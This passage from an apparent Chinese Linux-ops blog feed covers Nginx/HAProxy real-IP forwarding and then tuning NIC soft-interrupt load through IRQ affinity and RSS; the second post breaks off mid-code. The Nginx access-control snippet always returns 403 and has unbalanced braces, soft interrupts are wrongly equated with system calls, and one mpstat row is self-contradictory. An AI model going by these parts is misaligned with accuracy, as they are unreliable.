      <content type="html"><![CDATA[<h4 id="Nginx代理配置"><a href="#Nginx代理配置" class="headerlink" title="Nginx代理配置"></a>Nginx代理配置</h4><p>增加如下配置:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">proxy_set_header X-Real-IP $remote_addr;</div><div class="line">proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</div><div class="line">proxy_set_header X_FORWARDED_PROTO https;</div><div class="line">proxy_set_header Host $host;</div></pre></td></tr></table></figure></p>
<h4 id="Haproxy配置"><a href="#Haproxy配置" class="headerlink" title="Haproxy配置"></a>Haproxy配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">option forwardfor</div></pre></td></tr></table></figure>
<h4 id="后端Nginx配置"><a href="#后端Nginx配置" class="headerlink" title="后端Nginx配置"></a>后端Nginx配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">set_real_ip_from  1.1.1.1;  前端Nginx代理或者负载均衡的IP(在后端Nginx日志中显示的)</div><div class="line">real_ip_header  X-Forwarded-For;</div><div class="line">real_ip_recursive  on;</div></pre></td></tr></table></figure>
<h4 id="后端Nginx访问控制"><a href="#后端Nginx访问控制" class="headerlink" title="后端Nginx访问控制"></a>后端Nginx访问控制</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">location ~ /test/api/ &#123;</div><div class="line"></div><div class="line">    set $allow false;</div><div class="line">    if ($http_x_forwarded_for ~ &quot;2.2.2.2&quot;) &#123;</div><div class="line">        set $allow false;</div><div class="line">                    &#125;</div><div class="line">    if ($allow = false) &#123; return 403;&#125;</div><div class="line">        proxy_pass  http://web;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><blockquote>
<ul>
<li><a href="http://www.wkii.org/nginx-cdn-get-user-real-ip.html" target="_blank" rel="external">http://www.wkii.org/nginx-cdn-get-user-real-ip.html</a></li>
</ul>
</blockquote>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[网卡软中断过高问题优化总结]]></title>
      <url>/2017/02/28/net-softirq.html</url>
      <content type="html"><![CDATA[<h4 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h4><p>游戏网关高峰期时出网络丢包,CPU0软中断%sys高达90%</p>
<h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h4><h5 id="什么是中断"><a href="#什么是中断" class="headerlink" title="什么是中断?"></a>什么是中断?</h5><p>由于接收来自外围硬件(相对于CPU和内存)的异步信号或者来自软件的同步信号，而进行相应的硬件、软件处理；发出这样的信号称为进行中断请求(interrupt request, IRQ)</p>
<h5 id="硬中断与软中断"><a href="#硬中断与软中断" class="headerlink" title="硬中断与软中断?"></a>硬中断与软中断?</h5><ul>
<li><strong>硬中断</strong>：外围硬件发给CPU或者内存的异步信号就称之为硬中断</li>
<li><strong>软中断</strong>：由软件系统本身发给操作系统内核的中断信号，称之为软中断。通常是由硬中断处理程序或进程调度程序对操作系统内核的中断，也就是我们常说的系统调用(System Call)</li>
</ul>
<h5 id="硬中断与软中断之区别与联系？"><a href="#硬中断与软中断之区别与联系？" class="headerlink" title="硬中断与软中断之区别与联系？"></a>硬中断与软中断之区别与联系？</h5><ol>
<li>硬中断是有外设硬件发出的，需要有中断控制器之参与。其过程是外设侦测到变化，告知中断控制器，中断控制器通过CPU或内存的中断脚通知CPU，然后硬件进行程序计数器及堆栈寄存器之现场保存工作（引发上下文切换），并根据中断向量调用硬中断处理程序进行中断处理</li>
<li>软中断则通常是由硬中断处理程序或者进程调度程序等软件程序发出的中断信号，无需中断控制器之参与，直接以一个CPU指令之形式指示CPU进行程序计数器及堆栈寄存器之现场保存工作(亦会引发上下文切换)，并调用相应的软中断处理程序进行中断处理(即我们通常所言之系统调用)</li>
<li>硬中断直接以硬件的方式引发，处理速度快。软中断以软件指令之方式适合于对响应速度要求不是特别严格的场景</li>
<li>硬中断通过设置CPU的屏蔽位可进行屏蔽，软中断则由于是指令之方式给出，不能屏蔽</li>
<li>硬中断发生后，通常会在硬中断处理程序中调用一个软中断来进行后续工作的处理</li>
<li>硬中断和软中断均会引起上下文切换(进程/线程之切换)，进程切换的过程是差不多的</li>
</ol>
<h4 id="查看中断情况"><a href="#查看中断情况" class="headerlink" title="查看中断情况"></a>查看中断情况</h4><p><strong>查看中断分布情况即CPU都在哪些设备上干活，干了多少(也可以使用itop工具实时查看)？</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line">root@geekwolf:~# cat /proc/interrupts</div><div class="line"></div><div class="line">           CPU0       CPU1       CPU2       CPU3       CPU4       CPU5       CPU6       CPU7       CPU8       CPU9       CPU10      CPU11      CPU12      CPU13      CPU14      CPU15      CPU16      CPU17      CPU18      CPU19      CPU20      CPU21      CPU22      CPU23      CPU24      CPU25      CPU26      CPU27      CPU28      CPU29      CPU30      CPU31      </div><div class="line">  0:        620          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-IO-APIC-edge      timer</div><div class="line">  8:          1          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-IO-APIC-edge      rtc0</div><div class="line">  9:      20774          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-IO-APIC-fasteoi   acpi</div><div class="line"> 16:         28          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-IO-APIC-fasteoi   ehci_hcd:usb1</div><div class="line"> 23:        243          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-IO-APIC-fasteoi   ehci_hcd:usb2</div><div class="line"> 88:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  DMAR_MSI-edge      dmar0</div><div class="line"> 89:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  DMAR_MSI-edge      dmar1</div><div class="line"> 90:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      PCIe PME</div><div class="line"> 91:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      PCIe PME</div><div class="line"> 92:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      PCIe PME</div><div class="line"> 93:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      PCIe PME</div><div class="line"> 94:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      PCIe PME</div><div class="line"> 95:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      PCIe PME</div><div class="line"> 96:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      PCIe PME</div><div class="line"> 97:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      PCIe PME</div><div class="line"> 98:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      PCIe PME</div><div class="line"> 99:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      PCIe PME</div><div class="line">100:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      PCIe PME</div><div class="line">101:     169988          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      mpt2sas0-msix0</div><div class="line">134:    1900138          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      eth2-q0</div><div class="line">150:    4262209          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      eth3-q0</div><div class="line">166:          4          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix</div><div class="line">167:          4          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix</div><div class="line">168:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix</div><div class="line">169:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix</div><div class="line">170:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix</div><div class="line">171:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix</div><div class="line">172:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix</div><div class="line">173:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix</div><div class="line">174:          4          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix</div><div class="line">175:          4          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix</div><div class="line">176:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix</div><div class="line">177:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix</div><div class="line">178:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix</div><div class="line">179:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix</div><div class="line">180:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix</div><div class="line">181:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix</div><div class="line">NMI:        710        280        658        235        114         91         76         74        208        123        176        128        106         93        102         95         30        360        790         46         28         17         10          8         10        129       1166         22         18         16         11          7   Non-maskable interrupts</div><div class="line">LOC:    4230314    2640664    2427443    1337890    1091372     892129     819153     816781    2695809    1563153    1368637    1608410    1241692    1166692    1205270    1124865     120831    1966946     328048     816162     163492     222276     129805     121126     111906     599782    1247371     194215     162828     145678     118762     114295   Local timer interrupts</div><div class="line">SPU:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0   Spurious interrupts</div><div class="line">PMI:        710        280        658        235        114         91         76         74        208        123        176        128        106         93        102         95         30        360        790         46         28         17         10          8         10        129       1166         22         18         16         11          7   Performance monitoring interrupts</div><div class="line">IWI:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0   IRQ work interrupts</div><div class="line">RES:     679921    1369165    1013002     573776     543083     540027     593345     588120     842115     846190     874862     890102     873810     860080     867322     848916       3879      63916      10863      12850       7463       6350      10889      16041       2065      13207       6870       6817       4030       4700       5190       7430   Rescheduling interrupts</div><div class="line">CAL:      46507      67439      67569      67567      67565      67566      67566      67568     154689      67553      67511      67538      67568      67557      67534      67519      67520      26471      67470      67470      67476      67525      67518      67525      67545      64065      67210      67506      67485      67492      67526      67521   Function call interrupts</div><div class="line">TLB:       6547       3416       1798       1015        361        637        271        447        822        113       1079        222        259        198        265        844        157       1470       3468        767        499        262        338        230         41       1457       4023        290        105         93         46        177   TLB shootdowns</div><div class="line">TRM:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0   Thermal event interrupts</div><div class="line">THR:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0   Threshold APIC interrupts</div><div class="line">MCE:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0   Machine check exceptions</div><div class="line">MCP:        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569   Machine check polls</div><div class="line">ERR:          0</div><div class="line">MIS:          0</div></pre></td></tr></table></figure></p>
<p>从上面的数据可以看出网卡eth2、eth3软中断都落在CPU0可以通过cat /proc/softirqs查看具体的软中断情况,总的中断次数可以通过vmstat或者dstat查看，其中vmstat中的in表示每秒的中断次数；<br>通过mpstat -P ALL 2,每隔两秒查看下所有核状态信息，其中%irq为硬中断，%soft为软中断</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">root@geekwolf:~# mpstat -P ALL 2</div><div class="line">08:42:04 AM  CPU    %usr   %nice    %sys %iowait    %irq   %soft  %steal  %guest   %idle</div><div class="line">08:42:05 AM  all    4.31    0.00    0.70    0.00    0.00    0.06    0.00    0.00   94.93</div><div class="line">08:42:05 AM    0    5.26    0.00    1.05    0.00    0.00    60.05    0.00    0.00   92.63</div><div class="line">08:42:05 AM    1    7.07    0.00    1.01    0.00    0.00    0.00    0.00    0.00   91.92</div><div class="line">08:42:05 AM    2    8.91    0.00    0.99    0.00    0.00    0.00    0.00    0.00   90.10</div><div class="line">08:42:05 AM    3    8.00    0.00    1.00    0.00    0.00    0.00    0.00    0.00   91.00</div><div class="line">08:42:05 AM    4    8.00    0.00    1.00    0.00    0.00    0.00    0.00    0.00   91.00</div><div class="line">08:42:05 AM    5    7.00    0.00    2.00    0.00    0.00    0.00    0.00    0.00   91.00</div><div class="line">08:42:05 AM    6    7.00    0.00    1.00    0.00    0.00    0.00    0.00    0.00   92.00</div><div class="line">08:42:05 AM    7    4.12    0.00    1.03    0.00    0.00    0.00    0.00    0.00   94.85</div><div class="line">08:42:05 AM    8    4.17    0.00    1.04    0.00    0.00    0.00    0.00    0.00   94.79</div><div class="line">08:42:05 AM    9    8.91    0.00    0.99    0.00    0.00    0.00    0.00    0.00   90.10</div><div class="line">08:42:05 AM   10    4.17    0.00    2.08    0.00    0.00    0.00    0.00    0.00   93.75</div><div class="line">08:42:05 AM   11    6.12    0.00    1.02    0.00    0.00    0.00    0.00    0.00   92.86</div><div class="line">08:42:05 AM   12    6.00    0.00    2.00    0.00    0.00    0.00    0.00    0.00   92.00</div><div class="line">08:42:05 AM   13    3.16    0.00    1.05    0.00    0.00    0.00    0.00    0.00   95.79</div><div class="line">08:42:05 AM   14    8.16    0.00    1.02    0.00    0.00    0.00    0.00    0.00   90.82</div><div class="line">08:42:05 AM   15    6.06    0.00    1.01    0.00    0.00    1.01    0.00    0.00   91.92</div><div class="line">08:42:05 AM   16    3.00    0.00    1.00    0.00    0.00    0.00    0.00    0.00   96.00</div><div class="line">08:42:05 AM   17    2.02    0.00    1.01    0.00    0.00    0.00    0.00    0.00   96.97</div><div class="line">08:42:05 AM   18    2.04    0.00    1.02    0.00    0.00    0.00    0.00    0.00   96.94</div><div class="line">08:42:05 AM   19    2.97    0.00    0.99    0.00    0.00    0.00    0.00    0.00   96.04</div><div class="line">08:42:05 AM   20    2.04    0.00    0.00    0.00    0.00    0.00    0.00    0.00   97.96</div><div class="line">08:42:05 AM   21    2.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00   98.00</div><div class="line">08:42:05 AM   22    3.03    0.00    0.00    0.00    0.00    0.00    0.00    0.00   96.97</div><div class="line">08:42:05 AM   23    2.04    0.00    0.00    0.00    0.00    0.00    0.00    0.00   97.96</div><div class="line">08:42:05 AM   24    4.95    0.00    0.00    0.00    0.00    0.00    0.00    0.00   95.05</div><div class="line">08:42:05 AM   25    2.02    0.00    0.00    0.00    0.00    0.00    0.00    0.00   97.98</div><div class="line">08:42:05 AM   26    3.03    0.00    0.00    0.00    0.00    0.00    0.00    0.00   96.97</div><div class="line">08:42:05 AM   27    2.04    0.00    0.00    0.00    0.00    0.00    0.00    0.00   97.96</div><div class="line">08:42:05 AM   28    1.01    0.00    1.01    0.00    0.00    0.00    0.00    0.00   97.98</div><div class="line">08:42:05 AM   29    1.02    0.00    0.00    0.00    0.00    0.00    0.00    0.00   98.98</div><div class="line">08:42:05 AM   30    1.01    0.00    0.00    0.00    0.00    0.00    0.00    0.00   98.99</div><div class="line">08:42:05 AM   31    1.02    0.00    0.00    0.00    0.00    0.00    0.00    0.00   98.98</div></pre></td></tr></table></figure>
<h4 id="何优化软中断CPU0过高问题"><a href="#何优化软中断CPU0过高问题" class="headerlink" title="何优化软中断CPU0过高问题"></a>何优化软中断CPU0过高问题</h4><h5 id="RSS-Receive-Side-Scaling，需网卡支持多队列"><a href="#RSS-Receive-Side-Scaling，需网卡支持多队列" class="headerlink" title="RSS(Receive Side Scaling，需网卡支持多队列)"></a>RSS(Receive Side Scaling，需网卡支持多队列)</h5><h5 id="查看网卡是否支持队列"><a href="#查看网卡是否支持队列" class="headerlink" title="查看网卡是否支持队列"></a>查看网卡是否支持队列</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">root@geekwolf:~# lscpi -vvv</div><div class="line">06:00.0 Ethernet controller: Broadcom Corporation BCM57840 NetXtreme II 10/20-Gigabit Ethernet (rev 11)</div><div class="line"> Subsystem: Hewlett-Packard Company Device 22fa</div><div class="line"> Control: I/O- Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr+ Stepping- SERR+ FastB2B- DisINTx+</div><div class="line"> Status: Cap+ 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast &gt;TAbort- &lt;tabort - &lt;MAbort- &gt;SERR- &lt;perr - INTx-</div><div class="line"> Latency: 0, Cache Line Size: 64 bytes</div><div class="line"> Interrupt: pin A routed to IRQ 32</div><div class="line"> Region 0: Memory at 93800000 (64-bit, prefetchable) [size=8M]</div><div class="line"> Region 2: Memory at 93000000 (64-bit, prefetchable) [size=8M]</div><div class="line"> Region 4: Memory at 95000000 (64-bit, prefetchable) [size=64K]</div><div class="line"> [virtual] Expansion ROM at 95080000 [disabled] [size=512K]</div><div class="line"> Capabilities: [48] Power Management version 3</div><div class="line">   Flags: PMEClk- DSI- D1- D2- AuxCurrent=0mA PME(D0+,D1-,D2-,D3hot+,D3cold+)</div><div class="line">   Status: D0 NoSoftRst+ PME-Enable- DSel=0 DScale=1 PME-</div><div class="line"> Capabilities: [50] Vital Product Data</div><div class="line">   Product Name: HP FlexFabric 10Gb 2-port 536FLB Adapter</div><div class="line">   Read-only fields:</div><div class="line">     [PN] Part number: 766488-001</div><div class="line">     [EC] Engineering changes: A-5444</div><div class="line">     [MN] Manufacture ID: 31 30 33 43</div><div class="line">     [V0] Vendor specific: 12W PCIeGen3</div><div class="line">     [V1] Vendor specific: 7.10.55</div><div class="line">     [V3] Vendor specific: 7.10.72</div><div class="line">     [V5] Vendor specific: 0A</div><div class="line">     [V6] Vendor specific: 7.10.72</div><div class="line">     [V7] Vendor specific: 536FLB</div><div class="line">     [SN] Serial number: 7C444703LG</div><div class="line">     [V2] Vendor specific: 5447</div><div class="line">     [V4] Vendor specific: 8CDCD419D870</div><div class="line">     [RV] Reserved: checksum good, 186 byte(s) reserved</div><div class="line">   End</div><div class="line"> Capabilities: [a0] MSI-X: Enable+ Count=32 Masked-</div></pre></td></tr></table></figure>
<p>找到Ethernet controller项，如果有MSI-X,Enable+ 并且Count&gt;1，表示该网卡支持多队列</p>
<h5 id="查看网卡支持多少个队列"><a href="#查看网卡支持多少个队列" class="headerlink" title="查看网卡支持多少个队列"></a>查看网卡支持多少个队列</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">root@geekwolf:~# grep eth0 /proc/interrupts |awk &apos;&#123;print $NF&#125;&apos;</div><div class="line">eth0</div><div class="line">eth0-fp-0</div><div class="line">eth0-fp-1</div><div class="line">eth0-fp-2</div><div class="line">eth0-fp-3</div><div class="line">eth0-fp-4</div><div class="line">eth0-fp-5</div><div class="line">eth0-fp-6</div><div class="line">eth0-fp-7</div></pre></td></tr></table></figure>
<h5 id="配置SMP-IRQ-affinity"><a href="#配置SMP-IRQ-affinity" class="headerlink" title="配置SMP IRQ affinity"></a>配置SMP IRQ affinity</h5><p>(即绑定队列到不同CPU,Kernel&gt;2.4)</p>
<p>方法1：开启系统irqbalance服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apt-get -y install irqbalance</div><div class="line">service irqbalance start</div></pre></td></tr></table></figure>
<p>方法2: 手动绑定</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">/proc/irq/：该目录下存放的是以IRQ号命名的目录，如/proc/irq/40/，表示中断号为40的相关信息</div><div class="line">/proc/irq/[irq_num]/smp_affinity：该文件存放的是CPU位掩码（十六进制）。修改该文件中的值可以改变CPU和某中断的亲和性</div><div class="line">/proc/irq/[irq_num]/smp_affinity_list：该文件存放的是CPU列表（十进制）。注意，CPU核心个数用表示编号从0开始，如cpu0,cpu1等,</div><div class="line"></div><div class="line">smp_affinity和smp_affinity_list修改其一即可，下面修改smp_affinity：</div><div class="line"></div><div class="line">echo $bitmask &gt; /proc/irq/IRQ#/smp_affinity</div><div class="line">示例(把140号中断绑定到前4个CPU[cpu0-3]上面):</div><div class="line">echo  f &gt;/proc/irq/140/smp_affinity</div></pre></td></tr></table></figure>
<h5 id="CPU位掩码计算"><a href="#CPU位掩码计算" class="headerlink" title="CPU位掩码计算"></a>CPU位掩码计算</h5><p>一个十六进制f转换成二进制为1111，每一位表示一个CPU核，最靠右值是最低位即CPU0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">       Binary       Hex</div><div class="line">CPU 0    0001         1</div><div class="line">CPU 1    0010         2</div><div class="line">CPU 2    0100         4</div><div class="line">CPU 3    1000         8</div><div class="line">其中十六进制2就表示CPU1，十六进制8就表示CPU3</div><div class="line"></div><div class="line">       Binary       Hex</div><div class="line">CPU 0    0001         1</div><div class="line">+ CPU 2    0100         4</div><div class="line">-----------------------</div><div class="line">both     0101         5</div><div class="line">其中得出的十六进制和5表示CPU0 和CPU2</div><div class="line"></div><div class="line">       Binary       Hex</div><div class="line">CPU 0    0001         1</div><div class="line">CPU 1    0010         2</div><div class="line">CPU 2    0100         4</div><div class="line">+ CPU 3    1000         8</div><div class="line">-----------------------</div><div class="line">both     1111         f</div><div class="line">4个CPU参与中断，即可设置为f，8个CPU参与中断可设置为ff，以此类推</div></pre></td></tr></table></figure>
<h5 id="配置RSS"><a href="#配置RSS" class="headerlink" title="配置RSS"></a>配置RSS</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">过滤eth0中断号，绑定到0-7号CPU核上（eth0-fp命名可能有所不同）:</div><div class="line">root@geekwolf:~# grep eth0-fp /proc/interrupts |awk &apos;&#123;print $1, $NF&#125;&apos;</div><div class="line">147: eth0-fp-0</div><div class="line">148: eth0-fp-1</div><div class="line">149: eth0-fp-2</div><div class="line">150: eth0-fp-3</div><div class="line">151: eth0-fp-4</div><div class="line">152: eth0-fp-5</div><div class="line">153: eth0-fp-6</div><div class="line">154: eth0-fp-7</div><div class="line"></div><div class="line">echo 1  &gt;/proc/irq/147/smp_affinity</div><div class="line">echo 2  &gt;/proc/irq/148/smp_affinity</div><div class="line">echo 4  &gt;/proc/irq/149/smp_affinity</div><div class="line">echo 8  &gt;/proc/irq/150/smp_affinity</div><div class="line">echo 10 &gt;/proc/irq/151/smp_affinity</div><div class="line">echo 20 &gt;/proc/irq/152/smp_affinity</div><div class="line">echo 40 &gt;/proc/irq/153/smp_affinity</div><div class="line">echo 80 &gt;/proc/irq/154/smp_affinity</div><div 